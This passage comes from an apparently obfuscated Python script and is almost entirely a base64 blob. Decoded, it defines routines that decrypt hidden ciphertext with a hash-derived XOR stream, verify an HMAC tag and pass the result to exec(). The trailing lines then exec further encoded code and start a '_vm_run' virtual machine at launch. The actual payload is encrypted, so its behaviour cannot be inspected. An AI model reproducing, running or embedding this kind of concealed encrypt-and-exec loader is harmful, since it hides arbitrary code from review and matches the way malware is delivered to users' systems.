HJ4K3U1VTQwdW54OUp5T29SVDNQdENJMTRXNjIvbWRxc2FaanBuZ1djRGtDNjY5K0FNUEJvQk12RDNLajdGR1FOT2VJWTBGM0R6YkFBbVRoMnJuKzBMZDFQZkpKS3B1bldET2dMTlR0ZUo1WEhjWituUHRsUFRsdFZ1Y3E2T01pc1gwNTdnRlBjTzloWks3UW1uc1V4Unk2T1VsLzdySTcrKytqeGRPUHJKNk1xcjhhSzJkcm5sYnhWTkZORVVwTlRoYlg1VVdvQ25UOENQMlZUZzg3UTZiMTFBVGxsUEh5WEo1L3JDMG5FQWZiNTNod3BmYnJXbmV6UktJUmZPdEFuMGlycjdUN3BlV2c0Vy9Sd1FRYWZrWmRlQWRoMU5KRUhtVmFldTdWMUN6OVlYdXZ6WW4rcFVKcVNUS2RIbUY4UVhDN0ljY2lxNE5rc1lmVWhzbEpmTnBiSThteFZleFBFVkg4Zm1PUUNaL2lBVW5SWmFMc0xZcFhBVFdZMFFBMVZnajloWVQ5TzdMV0FuZHpoMCtlMk5sNW9PdmI0NnBTbm03Tkhrdlp6Qk1KMkpoOGtIME8wRVFaZVM1TXNkWngrcmdvZXpscnEwcVl3czVKN3ZaSEo1WkdoVGtQN1Bhb1FiM01aaEtsZXU4OGY5VnM3Tnlua25kSTNXbm00cWVzZlh1V1l2aVNiMjdkSEdZR1hRZWhUYy82QXZGQjc0ejB1Z0d1UnlvbXdzTytZenpmTUpBNEpWbXJiMGlPeUtnTXRrdVlvdHhPc09lQUpSUjhuUnpUMERZaHY4eVUxK2pIUlNvdzVPZGl2eDZIb3VjaHAvajE5cjJzbWQzUHFxeTFYTHcybjJxdVczbTQ2eWVFSzJQSlJLZGxGN1dOV3hhcitPVmxyNFJ5UC9qMEZkYXRoMkVoa1ozOTlSZUR1U0dOMVpWWU5Ick5pc1hLVTVwWXRJcnRhbDFxWFZXNHZHVTNZZnV1SWhnbm9NZ2pTVU9jZUtUcERIR1hNMU9zWXJiWmtKZE9RelZTZEJENWgwWTBQeDJ0MlRGRHVrSTE3V20zcHF6N3JscVp6MUtMVTJVdmdhWk5YVzdGamI3RlhKZDFGOGlhZCt5cVF5cGxnZGU2SGgxQzl2RXQvam91RkJ2VWRvaGN6WG9CeWJnZWFTaSs3b3RWRjA1WlVUWnEwZHF3WndKOURGNkV3aU9EN1pHM3NwQ1d5Y1hRaFpReDk4S3lzTVFmaUZXY3ZUWksxTXQySXNKMUhxNlpYY1h3anpyRncxS1VaN0V4ZFl1WVROWDNLZ0NWelVPRGw0R0VoazZCdDRseGdhU3Y0cTFpUjBOV3BiN3BXYXN0a3pQNzhVWWN5b2s3SWd1OUN2amJGNlZ5cFU2K3ZjSkxuT0lYQ0VpN2MxMXlBbUZoQ0ZXWEV4ZndTd0ZoR29aeitxREJJVEpCeE0rbDYyOXR0R3JaM05COFRFTktobVF2MFh4aDQ4YTg3bVNHUkgzdHAyanVHTWxDV09GMW10YWttUFlyOHpnbDRIYVp0MGpLb0UzZ25pYndkdlFxcGt4V1Nua0UyUEE4eTgrTFZRUCs0ak1HcDFqWGI0TzZUbm85VUVaRDUybkI0NjZzNzVvcTFVQzdPdHU0K2NrWHZOUlNKall1S3hZSlJFcVFqL0NZM2xTdkVUOEwyblRZOHh0enlwTUpRNzNSWGFsRmtkR1R4VHlEVVdQWnZUeU1YSHo1VzZBWTZEd3dhclp3SEF6SS82UlFEd0VMckZzWWFoaHFWYTRxWS9FNnJOOGUwS1lxMzh1OUlmU2c0ZlpMSHN5eFpiZndNNWdITnJQSitaR1FNY25CRHRLa01adDVQSGxubjY1Y2VZWWZLRFVxWHY1aDBodjJSUStNOCtiTFhqbzZNN2tQa0h5UWtjaDhmNXU4THNZdmIyMi9XdlZWdW5RS3c4WCs0dm1NQno0SVNjb0JRd2JpazhvajFWYnA0N2s2T3NqTkVmWXkwcG42eWEwcEVmRk04M0RLWkE3cElyZDc1ZGM2ajdHUTlOenAxcW96TzUyZWFSWjM2SXozeTRJeEFQbmtkOXVKWDNlbnBuMW5mbWgvcVA0dXZ0LzBpM0J5WFlzTnNJN3BCSzhkUUR4U2Rhd1E2dEVtYys3SW80WDdvYzRaaDlBVXp6WnNqUT09JyldCl9GVU5DX0NBQ0hFID0ge30KCmRlZiBfZXhlY19lbmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKYXN5bmMgZGVmIF9leGVjX2VuY19hc3luYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIGF3YWl0IF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gYXdhaXQgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0CgpkZWYgX3hvcl9zdHJlYW0oa2V5LCBkYXRhKToKICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpCiAgICBjb3VudGVyID0gMAogICAgd2hpbGUgbGVuKHJlc3VsdCkgPCBsZW4oZGF0YSk6CiAgICAgICAga3MgPSBoYXNobGliLnNoYTI1NihrZXkgKyBjb3VudGVyLnRvX2J5dGVzKDgsICdiaWcnKSkuZGlnZXN0KCkKICAgICAgICBjaHVuayA9IGRhdGFbbGVuKHJlc3VsdCk6bGVuKHJlc3VsdCkgKyAzMl0KICAgICAgICBmb3IgYSwgYiBpbiB6aXAoY2h1bmssIGtzKToKICAgICAgICAgICAgcmVzdWx0LmFwcGVuZChhIF4gYikKICAgICAgICBjb3VudGVyICs9IDEKICAgIHJldHVybiBieXRlcyhyZXN1bHQpCgpkZWYgX2IoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMCwgX0ZVTkNfS0VZLCAnX2InLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2UoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMSwgX0ZVTkNfS0VZLCAnX2UnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2YoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMiwgX0ZVTkNfS0VZLCAnX2YnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2coKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMywgX0ZVTkNfS0VZLCAnX2cnLCBhcmdzLCBrd2FyZ3Mp"), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _ibqzcl()
